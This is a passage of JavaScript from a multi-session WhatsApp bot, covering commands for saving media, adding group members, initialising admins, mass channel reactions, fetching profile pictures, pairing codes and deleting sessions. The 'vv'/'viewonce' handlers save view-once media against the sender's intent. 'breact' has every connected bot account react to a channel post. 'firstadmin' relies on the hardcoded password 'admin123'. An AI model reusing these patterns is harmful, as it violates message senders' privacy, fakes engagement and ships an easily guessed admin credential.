│. ˚˖𓍢ִ໋✅ ᴜᴘʟᴏᴀᴅ sᴜᴄᴄᴇssғᴜʟ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });

    } catch (e) {
        console.error("[UPCH ERROR]:", e);
        await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });

        try {
            if (quoted) {
                await socket.sendMessage(channelJid, {
                    forward: {
                        key: { remoteJid: from, fromMe: false, id: msg.key.id },
                        message: quoted
                    }
                });

                await socket.sendMessage(sender, { react: { text: "↩️", key: msg.key } });

                await socket.sendMessage(sender, {
                    text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⚠️ ғᴀʟʟʙᴀᴄᴋ sᴇɴᴛ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
                }, { quoted: msg });
            }
        } catch (fallbackError) {
            console.error("[UPCH FALLBACK ERROR]:", fallbackError);
            await socket.sendMessage(sender, {
                text: `❌ ${e.message}`
            }, { quoted: msg });
        }
    }

    break;
}

            
            
            // ============ FORWARD/RETURN VOICE ============
case 'vv2':
case 'wah':
case 'ohh':
case '🤤':
case '🙂':
case '😂':
case '❤️':
case '💋':
case '🥵':
case '🌚':
case '😒':
case 'nice':
case 'ok': {
try {

if (!isCreator) return; // owner only silently ignore

if (!m.quoted) {
  return await conn.sendMessage(from, {
    text: "*🍁 Please reply to a view once message!*",
    contextInfo: {
      newsletterJid: "120363426341519710@newsletter",
      newsletterName: "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓"
    }
  }, { quoted: m });
}

const buffer = await m.quoted.download();
const mtype = m.quoted.mtype;

let messageContent = {};

switch (mtype) {

  case "imageMessage":
    messageContent = {
      image: buffer,
      caption: m.quoted.text || '',
      mimetype: m.quoted.mimetype || "image/jpeg"
    };
    break;

  case "videoMessage":
    messageContent = {
      video: buffer,
      caption: m.quoted.text || '',
      mimetype: m.quoted.mimetype || "video/mp4"
    };
    break;

  case "audioMessage":
    messageContent = {
      audio: buffer,
      mimetype: "audio/mp4",
      ptt: m.quoted.ptt || false
    };
    break;

  default:
    return await conn.sendMessage(from, {
      text: "❌ Only image, video, and audio messages are supported",
      contextInfo: {
        newsletterJid: "120363426341519710@newsletter",
        newsletterName: "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓"
      }
    }, { quoted: m });
}

// Send to sender DM
await conn.sendMessage(m.sender, messageContent);

} catch (error) {
console.error("vv Error:", error);
await conn.sendMessage(from, {
  text: "❌ Error fetching vv message:\n" + error.message,
  contextInfo: {
    newsletterJid: "120363426341519710@newsletter",
    newsletterName: "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓"
  }
}, { quoted: m });
}
}
break;


case 'vv':
case 'viewonce': {

  try {

    // ===== REACT =====
    await socket.sendMessage(sender, {
      react: {
        text: "📥",
        key: msg.key
      }
    });

    const quoted =
      msg?.quoted ||
      msg?.message?.extendedTextMessage?.contextInfo?.quotedMessage;

    if (!quoted) {
      return await socket.sendMessage(sender, {
        text: `❌ *${toSmallCaps("reply to a viewonce message")}*`
      }, { quoted: msg });
    }

    // ===== EXTRACT VIEWONCE =====
    const innerMsg =
      quoted.viewOnceMessage?.message ||
      quoted.ephemeralMessage?.message?.viewOnceMessage?.message ||
      quoted;

    const type =
      innerMsg?.imageMessage ? 'imageMessage' :
      innerMsg?.videoMessage ? 'videoMessage' :
      innerMsg?.audioMessage ? 'audioMessage' : null;

    if (!type) {
      return await socket.sendMessage(sender, {
        text: `❌ *${toSmallCaps("this is not a valid viewonce message")}*`
      }, { quoted: msg });
    }

    const mediaMsg = innerMsg[type];

    // ===== DOWNLOAD =====
    const stream = await downloadContentFromMessage(
      mediaMsg,
      type.replace('Message', '')
    );

    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }

    let caption = mediaMsg.caption || `*${toSmallCaps("saved media")}*`;

    // ===== BUTTONS =====
    const buttons = [
      {
        buttonId: '.menu',
        buttonText: { displayText: '📋 ᴍᴇɴᴜ' },
        type: 1
      },
      {
        buttonId: '.repo',
        buttonText: { displayText: '📦 ʀᴇᴘᴏ' },
        type: 1
      }
    ];

    // ===== THUMB =====
    let thumbnail = type === 'imageMessage' ? buffer : null;

    // ===== SEND =====
    if (type === 'imageMessage') {

      await socket.sendMessage(sender, {
        image: buffer,
        caption,
        buttons,
        footer: "ᴠɪᴇᴡᴏɴᴄᴇ sᴀᴠᴇʀ",
        contextInfo: {
          externalAdReply: {
            title: "VIEWONCE IMAGE",
            body: "saved by bot",
            thumbnail,
            sourceUrl: "https://wa.me/",
            mediaType: 1
          }
        }
      }, { quoted: msg });

    } else if (type === 'videoMessage') {

      await socket.sendMessage(sender, {
        video: buffer,
        caption,
        buttons,
        footer: "ᴠɪᴇᴡᴏɴᴄᴇ sᴀᴠᴇʀ",
        contextInfo: {
          externalAdReply: {
            title: "VIEWONCE VIDEO",
            body: "saved by bot",
            mediaType: 1
          }
        }
      }, { quoted: msg });

    } else if (type === 'audioMessage') {

      await socket.sendMessage(sender, {
        audio: buffer,
        mimetype: "audio/mp4",
        ptt: false,
        buttons,
        footer: "ᴠɪᴇᴡᴏɴᴄᴇ sᴀᴠᴇʀ"
      }, { quoted: msg });

    }

    // ===== REACT DONE =====
    await socket.sendMessage(sender, {
      react: {
        text: "✅",
        key: msg.key
      }
    });

  } catch (e) {
    console.error("VV2 ERROR:", e);

    await socket.sendMessage(sender, {
      react: {
        text: "❌",
        key: msg.key
      }
    });

    await socket.sendMessage(sender, {
      text: `❌ Error: ${e.message || e}`
    }, { quoted: msg });
  }

  break;
}


case 'send':
case 'sendme':
case 'save': {
    try {

        const quoted = m.quoted || m;

        if (!m.quoted) {
            return await conn.sendMessage(from, {
                text: "🍁 Reply to a message first!"
            }, { quoted: m });
        }

        const buffer = await quoted.download();
        const type = quoted.mtype;

        let msg;

        switch (type) {

            case "imageMessage":
                msg = {
                    image: buffer,
                    caption: quoted.text || ""
                };
                break;

            case "videoMessage":
                msg = {
                    video: buffer,
                    caption: quoted.text || ""
                };
                break;

            case "audioMessage":
                msg = {
                    audio: buffer,
                    mimetype: "audio/mp4",
                    ptt: quoted.ptt || false
                };
                break;

            default:
                return conn.sendMessage(from, {
                    text: "❌ Only image, video, audio supported"
                }, { quoted: m });
        }

        await conn.sendMessage(from, msg, { quoted: m });

    } catch (e) {
        console.log(e);
        conn.sendMessage(from, {
            text: "❌ Error sending message:\n" + e.message
        }, { quoted: m });
    }
}
break;


            // ============ COMMANDE INCONNUE ============

// --- utilitaire minimal pour settings de groupe (si besoin) ---


// --- HANDLERS : add, kick, mute, unmute ---
// Variables attendues dans le scope : socket, from (chatId), sender, msg, args

case 'add': {
  if (!from.endsWith('@g.us')) {
    await socket.sendMessage(sender, { text: "❗ Cette commande doit être utilisée dans un groupe." }, { quoted: msg });
    break;
  }
  try {
    const metadata = await socket.groupMetadata(from);
    const participants = metadata.participants || [];
    const botNumber = socket.user.id.split(':')[0] + '@s.whatsapp.net';
    const groupAdmins = participants.filter(p => p.admin).map(p => p.id);

    if (!groupAdmins.includes(sender)) {
      await socket.sendMessage(from, { text: '❌ Seuls les admins peuvent utiliser cette commande.' }, { quoted: msg });
      break;
    }
    if (!groupAdmins.includes(botNumber)) {
      await socket.sendMessage(from, { text: '❌ Je dois être admin pour ajouter des membres.' }, { quoted: msg });
      break;
    }

    const number = args[0];
    if (!number) return await socket.sendMessage(from, { text: 'Usage: .add <numéro sans + ou @>' }, { quoted: msg });

    const jidToAdd = number.includes('@') ? number : `${number}@s.whatsapp.net`;
    try {
      await socket.groupParticipantsUpdate(from, [jidToAdd], 'add');
      await socket.sendMessage(from, { text: `✅ Ajouté: ${jidToAdd}` }, { quoted: msg });
    } catch (e) {
      console.error('[ERROR add]', e);
      await socket.sendMessage(from, { text: '❌ Impossible d\'ajouter ce numéro. Vérifie le format ou les permissions.' }, { quoted: msg });
    }
  } catch (e) {
    console.error('[ERROR add outer]', e);
    await socket.sendMessage(sender, { text: `❌ Erreur lors de l'ajout.\n\n${e.message || e}` }, { quoted: msg });
  }
  break;
}



// ============ FIN DES COMMANDES DE GROUPE ============
          

          

case 'firstadmin': {
  try {
    const args = body.trim().split(' ');
    
    if (args.length < 4) {
      await socket.sendMessage(sender, { 
        text: 
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔐 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐅𝐈𝐑𝐒𝐓𝐀𝐃𝐌𝐈𝐍*
│. ˚˖𓍢ִ໋⚠️ ɪɴɪᴛɪᴀʟɪsᴀᴛɪᴏɴ
│
│. ˚˖𓍢ִ໋❌ Format : !firstadmin <password> <numéro> <nom>
│. ˚˖𓍢ִ໋💡 Exemple : !firstadmin AdminInit123 00000000000 Super Admin
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }
    
    const password = args[1];
    const numero = args[2];
    const nom = args.slice(3).join(' ');
    
    const TEMP_PASSWORD = 'admin123';
    
    if (password !== TEMP_PASSWORD) {
      await socket.sendMessage(sender, { 
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐂𝐂𝐄𝐒𝐒*
│. ˚˖𓍢ִ໋🔒 ᴡʀᴏɴɢ ᴘᴀssᴡᴏʀᴅ
│
│. ˚˖𓍢ִ໋⚠️ Contact dev for access
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }
    
    const existingAdmins = await loadAdminsFromMongo();
    if (existingAdmins.length > 0) {
      await socket.sendMessage(sender, { 
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⚠️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐃𝐌𝐈𝐍*
│. ˚˖𓍢ִ໋🚫 ᴀʟʀᴇᴀᴅʏ ɪɴɪᴛɪᴀʟɪᴢᴇᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }
    
    const numeroNettoye = numero.replace(/[^0-9]/g, '');
    const jid = `${numeroNettoye}@s.whatsapp.net`;
    
    await adminsCol.updateOne(
      { jid }, 
      { 
        $set: { 
          jid, 
          name: nom, 
          addedAt: new Date(), 
          addedBy: 'first_init',
          isSuperAdmin: true 
        } 
      }, 
      { upsert: true }
    );
    
    console.log(`🎉 Premier admin initialisé : ${nom} (${jid})`);
    
    await socket.sendMessage(sender, { 
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🎊 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒*
│. ˚˖𓍢ִ໋👑 ᴀᴅᴍɪɴ ɪɴɪᴛɪᴀʟɪᴢᴇᴅ
│
│. ˚˖𓍢ִ໋👤 ɴᴀᴍᴇ : ${nom}
│. ˚˖𓍢ִ໋📱 ɴᴜᴍʙᴇʀ : ${numeroNettoye}
│. ˚˖𓍢ִ໋🔗 ᴊɪᴅ : ${jid}
│. ˚˖𓍢ִ໋🔐 sᴜᴘᴇʀ ᴀᴅᴍɪɴ
│. ˚˖𓍢ִ໋📅 ${getHaitiTimestamp()}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
    
  } catch (error) {
    console.error('❌ Erreur firstadmin:', error);
    await socket.sendMessage(sender, { 
      text: 
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ${error.message}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}

case 'breact': {
  try {
    const admins = await loadAdminsFromMongo();
    const senderJid = nowsender;
    const isAdmin = admins.some(adminJid => 
      adminJid === senderJid || adminJid === senderJid.split('@')[0]
    );
    
    if (!isAdmin) {
      await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });
      await socket.sendMessage(sender, { 
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐁𝐑𝐄𝐀𝐂𝐓*
│. ˚˖𓍢ִ໋🚫 ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ
│
│. ˚˖𓍢ִ໋⚠️ ᴀᴅᴍɪɴs ᴏɴʟʏ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const q = body.split(' ').slice(1).join(' ').trim();
    if (!q.includes(',')) {
      await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });
      await socket.sendMessage(sender, { 
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📌 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐁𝐑𝐄𝐀𝐂𝐓*
│. ˚˖𓍢ִ໋⚙️ ғᴏʀᴍᴀᴛ ᴇʀʀᴏʀ
│
│. ˚˖𓍢ִ໋💡 !breact <channel/message>,<emoji>
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const parts = q.split(',');
    let channelRef = parts[0].trim();
    const reactEmoji = parts[1].trim();

    let channelJid = null;
    let messageId = null;

    const urlMatch = channelRef.match(/whatsapp\.com\/channel\/([^\/]+)\/(\d+)/);
    if (urlMatch) {
      channelJid = `${urlMatch[1]}@newsletter`;
      messageId = urlMatch[2];
    } else {
      const maybeParts = channelRef.split('/');
      if (maybeParts.length >= 2) {
        messageId = maybeParts[maybeParts.length - 1];
        channelJid = maybeParts[maybeParts.length - 2];
        if (/^\d+$/.test(channelJid)) channelJid = `${channelJid}@newsletter`;
      }
    }

    if (!channelJid || !messageId || !channelJid.endsWith('@newsletter')) {
      await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });
      await socket.sendMessage(sender, { 
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐁𝐑𝐄𝐀𝐂𝐓*
│. ˚˖𓍢ִ໋⚠️ ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀᴛ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const allNumbers = await getAllNumbersFromMongo();
    const connectedNumbers = allNumbers.filter(num => activeSockets.has(num));

    await socket.sendMessage(sender, { react: { text: "☑️", key: msg.key } });

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🚀 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐁𝐑𝐄𝐀𝐂𝐓*
│. ˚˖𓍢ִ໋📡 ʟᴀᴜɴᴄʜɪɴɢ ʀᴇᴀᴄᴛɪᴏɴs
│
│. ˚˖𓍢ִ໋🤖 ʙᴏᴛs : ${connectedNumbers.length}
│. ˚˖𓍢ִ໋😊 ᴇᴍᴏᴊɪ : ${reactEmoji}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    (async () => {
      const results = [];

      for (const botNumber of connectedNumbers) {
        try {
          const botSocket = activeSockets.get(botNumber);

          try {
            await botSocket.newsletterFollow(channelJid);
            await delay(1500);
          } catch {}

          await botSocket.newsletterReactMessage(channelJid, messageId, reactEmoji);
          await saveNewsletterReaction(channelJid, messageId, reactEmoji, botNumber);

          results.push({ bot: botNumber, status: '✅' });

        } catch (error) {
          results.push({ bot: botNumber, status: '❌', error: error.message });
        }

        await delay(1000);
      }

      const successCount = results.filter(r => r.status === '✅').length;
      const failCount = results.filter(r => r.status === '❌').length;

      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📊 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐑𝐄𝐏𝐎𝐑𝐓*
│. ˚˖𓍢ִ໋✅ sᴜᴄᴄᴇss : ${successCount}
│. ˚˖𓍢ִ໋❌ ғᴀɪʟ : ${failCount}
│. ˚˖𓍢ִ໋📡 ᴛᴏᴛᴀʟ : ${connectedNumbers.length}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      });

    })();

  } catch (error) {
    await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ${error.message}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}

case 'getpp': {
  try {

    // ===== OWNER ONLY =====
    if (!isOwner) {

      await socket.sendMessage(sender, {
        react: {
          text: "❌",
          key: msg.key
        }
      });

      return await socket.sendMessage(sender, {
        text: "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴍʏ ᴏᴡɴᴇʀ ʙʀᴏ"
      }, {
        quoted: msg
      });
    }

    // ===== REACT =====
    await socket.sendMessage(sender, {
      react: {
        text: "📸",
        key: msg.key
      }
    });

    let user;

    // ===== TARGET =====
    if (quoted) {

      // Reply message
      user = quoted.sender;

    } else if (!isGroup) {

      // Private chat
      user = sender;

    } else if (
      mentionedJid &&
      mentionedJid[0]
    ) {

      // Mentioned user
      user = mentionedJid[0];

    } else {

      // Self
      user = sender;
    }

    // ===== GET PROFILE =====
    let ppUrl;

    try {

      ppUrl =
        await socket.profilePictureUrl(
          user,
          'image'
        );

    } catch (e) {

      return await socket.sendMessage(sender, {
        text: `❌ *${toSmallCaps("error")} :* ${toSmallCaps("profile picture is private or not found")}`
      }, {
        quoted: msg
      });
    }

    // ===== MESSAGE =====
    const ppMsg = `
🖼️ *${toSmallCaps("profile picture retrieved")}*

👤 *${toSmallCaps("target")} :* @${user.split('@')[0]}

> *${toSmallCaps("optimized by you tech")}*
`.trim();

    // ===== SEND =====
    await socket.sendMessage(sender, {
      image: {
        url: ppUrl
      },
      caption: ppMsg,
      mentions: [user],
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,

        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363404137900781@newsletter',
          newsletterName: '𝐘𝐎𝐔 𝐌𝐃 𝐁𝐎𝐓',
          serverMessageId: 125
        },

        externalAdReply: {
          title: toSmallCaps("you md profile"),
          body: toSmallCaps("profile picture fetcher"),
          mediaType: 1,
          renderLargerThumbnail: false,
          sourceUrl: "https://whatsapp.com/channel/0029Vb7EpGwBlHpXKNgFET1Z"
        }
      }
    }, {
      quoted: msg
    });

    // ===== SUCCESS REACT =====
    await socket.sendMessage(sender, {
      react: {
        text: "✅",
        key: msg.key
      }
    });

  } catch (e) {

    console.error("GETPP ERROR:", e);

    await socket.sendMessage(sender, {
      text: toSmallCaps("failed to get profile picture")
    }, {
      quoted: msg
    });
  }
}
break;
                
case 'pair':
case 'code': {
  const q = msg.message?.conversation ||
            msg.message?.extendedTextMessage?.text ||
            msg.message?.imageMessage?.caption ||
            msg.message?.videoMessage?.caption || '';
  
  const args = q.trim().split(/\s+/);
  args.shift();
  const number = args.join(' ').trim();

  if (!number) {
    return await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔑 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐃𝐄*
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ ɪɴᴄᴏʀʀᴇᴄᴛ
│
│. ˚˖𓍢ִ໋💡 .code <numéro>
│. ˚˖𓍢ִ໋📱 Exemple : .code 5094744XXXX
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }

  const cleanNumber = number.replace(/[^\d]/g, '');
  if (cleanNumber.length < 9 || cleanNumber.length > 15) {
    return await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐃𝐄*
│. ˚˖𓍢ִ໋⚠️ ғᴏʀᴍᴀᴛ ᴇʀʀᴏʀ
│
│. ˚˖𓍢ִ໋📌 9–15 chiffres requis
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }

  try {
    await socket.sendMessage(sender, { react: { text: "⏳", key: msg.key } });

    let fetch;
    try {
      fetch = (await import('node-fetch')).default;
    } catch {
      fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
    }

    const url = `https://you-md-16ae1781ef16.herokuapp.com/code?number=${encodeURIComponent(cleanNumber)}`;
    const response = await fetch(url, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (WhatsAppBot)',
        'Accept': 'application/json'
      },
      timeout: 30000
    });

    if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);

    const bodyText = await response.text();
    let result;

    try {
      result = JSON.parse(bodyText);
    } catch {
      const codeMatch = bodyText.match(/"code"\s*:\s*"([^"]+)"/) ||
                        bodyText.match(/'code'\s*:\s*'([^']+)'/);
      if (codeMatch) result = { code: codeMatch[1] };
      else throw new Error("Réponse invalide du serveur");
    }

    if (!result || !result.code) throw new Error("Aucun code reçu");

    const code = result.code.trim();

    await socket.relayMessage(sender, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔐 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐃𝐄*
│. ˚˖𓍢ִ໋📱 ${cleanNumber}
│
│. ˚˖𓍢ִ໋🔑 ᴄᴏᴅᴇ : ${code}
│
│. ˚˖𓍢ִ໋📋 ɪɴsᴛʀᴜᴄᴛɪᴏɴs :
│. ˚˖𓍢ִ໋1. WhatsApp → Appareils liés
│. ˚˖𓍢ִ໋2. Connecter un appareil
│. ˚˖𓍢ִ໋3. Entrer le code
│
│. ˚˖𓍢ִ໋⚠️ ᴇxᴘɪʀᴇ ᴀᴘʀès 20s
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
            },
            footer: { text: "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓" },

            header: {
              hasMediaAttachment: true,
              imageMessage: {
                url: "./menu6.jpg"
              },
              title: "Connexion WhatsApp"
            },

            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "📋 Copier le code",
                    id: "copy_code",
                    copy_code: code
                  })
                }
              ]
            }
          }
        }
      }
    }, { quoted: msg });

    await socket.sendMessage(sender, { react: { text: "✅", key: msg.key } });

  } catch (err) {
    console.error("❌ Erreur commande code:", err);

    await socket.sendMessage(sender, { react: { text: "❌", key: msg.key } });

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ${err.message || err}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }

  break;
}
  
case 'deleteme': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  const senderNum = (nowsender || '').split('@')[0];
  const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');

  if (senderNum !== sanitized && senderNum !== ownerNum) {
    await socket.sendMessage(sender, {
      text: `╭┄ 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 \n` +
            `│. • 𝚂𝚃𝙰𝚃𝚄𝚂 : ᴀᴄᴄᴇs ᴅᴇɴɪᴇᴅ\n` +
            `│. • 𝙼𝙾𝙳𝙴 : ᴅᴇʟᴇᴛᴇ sᴇssɪᴏɴ\n` +
            `│. • 𝚁𝙴𝙰𝚂𝙾𝙽 : ᴘᴇʀᴍɪssɪᴏɴ ʙʟᴏᴄᴋ\n` +
            `╰┄────────────────╯`
    }, { quoted: msg });
    break;
  }

  try {
    await removeSessionFromMongo(sanitized);
    await removeNumberFromMongo(sanitized);

    const sessionPath = path.join(os.tmpdir(), `session_${sanitized}`);
    try {
      if (fs.existsSync(sessionPath)) {
        fs.removeSync(sessionPath);
      }
    } catch (e) {}

    try {
      if (typeof socket.logout === 'function') {
        await socket.logout().catch(() => {});
      }
    } catch (e) {}
    try { socket.ws?.close(); } catch (e) {}

    activeSockets.delete(sanitized);
    socketCreationTime.delete(sanitized);

    await socket.sendMessage(sender, {
      image: { url: config.RCD_IMAGE_PATH },
      caption:
        `╭┄ 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 \n` +
        `│. • 𝚂𝙴𝚂𝚂𝙸𝙾𝙽 : ᴅᴇʟᴇᴛᴇᴅ\n` +
        `│. • 𝙸𝙳 : ${sanitized}\n` +
        `│. • 𝚂𝚃𝙰𝚃𝚄𝚂 : sᴜᴄᴄᴇss\n` +
        `╰┄────────────────╯`
    }, { quoted: msg });

  } catch (err) {
    await socket.sendMessage(sender, {
      text:
        `╭┄ 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 \n` +
        `│. • 𝙴𝚁𝚁𝙾𝚁 : ᴅᴇʟᴇᴛᴇ ғᴀɪʟᴇᴅ\n` +
        `│. • 𝚁𝙴𝙰𝚂𝙾𝙽 : ${err.message || err}\n` +
        `╰┄────────────────╯`
    }, { quoted: msg });
  }

  break;
}

case 'deletemenumber': {
  const targetRaw = (args && args[0]) ? args[0].trim() : '';
  if (!targetRaw) {
    await socket.sendMessage(sender, {
      text:
        `╭┄ 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓\n` +
        `│. • 𝙲𝙼𝙳 : ᴅᴇʟᴇᴛᴇ ɴᴜᴍʙᴇʀ\n` +
        `│. • 𝚄𝚂𝙰𝙶𝙴 : .deletemenumber <number>\n` +
        `│. • 𝙴𝚇 : .deletemenumber 9478xxxxxx\n` +
        `╰┄────────────────╯`
    }, { quoted: msg });
    break;
  }

  const target = targetRaw.replace(/[^0-9]/g, '');
  if (!/^\d{6,}$/.test(target)) {
    await socket.sendMessage(sender, {
      text:
        `╭┄ 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 \n` +
        `│. • 𝚂𝚃𝙰𝚃𝚄𝚂 : ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ\n` +
        `│. • 𝚁𝙴𝙰𝚂𝙾𝙽 : ғᴏʀᴍᴀᴛ ᴇʀʀᴏʀ\n` +
        `╰┄────────────────╯`
    }, { quoted: msg });
    break;
  }

  const senderNum = (nowsender || '').split('@')[0];
  const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');

  let allowed = false;
  if (senderNum === ownerNum) allowed = true;
  else {
    try {
      const adminList = await loadAdminsFromMongo();
      if (Array.isArray(adminList) && adminList.some(a =>
        a.replace(/[^0-9]/g,'') === senderNum ||
        a === senderNum ||
        a === `${senderNum}@s.whatsapp.net`
      )) {
        allowed = true;
      }
    } catch (e) {}
  }

  if (!allowed) {
    await socket.sendMessage(sender, {
      text:
        `╭┄ 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓\n` +
        `│. • 𝚂𝚃𝙰𝚃𝚄𝚂 : ᴅᴇɴɪᴇᴅ\n` +
        `│. • 𝙰𝙲𝙲𝙴𝚂𝚂 : ᴀᴅᴍɪɴ ᴏɴʟʏ\n` +
        `╰┄────────────────╯`
    }, { quoted: msg });
    break;
  }

  try {
    await socket.sendMessage(sender, {
      text:
        `╭┄ 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓\n` +
        `│. • 𝙰𝙲𝚃𝙸𝙾𝙽 : ᴅᴇʟᴇᴛɪɴɢ sᴇssɪᴏɴ\n` +
        `│. • 𝚃𝙰𝚁𝙶𝙴𝚃 : ${target}\n` +
        `│. • 𝚂𝚃𝙰𝚃𝚄𝚂 : ᴘʀᴏᴄᴇssɪɴɢ...\n` +
        `╰┄────────────────╯`
    }, { quoted: msg });

    const runningSocket = activeSockets.get(target);
    if (runningSocket) {
      try {
        if (typeof runningSocket.logout === 'function') {
          await runningSocket.logout().catch(() => {});
        }
